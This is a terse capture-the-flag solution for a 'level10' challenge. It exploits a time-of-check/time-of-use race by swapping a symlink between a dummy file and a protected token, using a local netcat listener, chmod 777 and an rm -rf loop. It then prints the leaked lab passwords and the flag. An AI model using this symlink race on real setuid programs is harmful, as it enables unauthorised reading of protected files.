@@ -1,0 +1,29 @@
+su level10
+password: s5cAJpM8ev6XHw998pRWG728z
+
+chmod 777 .
+touch haha
+chmod 777 haha
+ln -s haha mylink
+
+
+in terminal[1]:
+
+while true; do nc -l 6969; done
+
+
+
+in terminal[2]:
+while true; do ./level10 mylink 127.0.0.1 ; done
+
+
+in terminal[3]
+while true; do rm -rf haha && mv token haha && mv haha token && touch haha; done
+
+
+in terminal[1]   =>   woupa2yuojeeaaed06riuj63c
+
+su flag10
+password: woupa2yuojeeaaed06riuj63c
+
+getflag ->   feulo4b72j7edeahuete3no7c
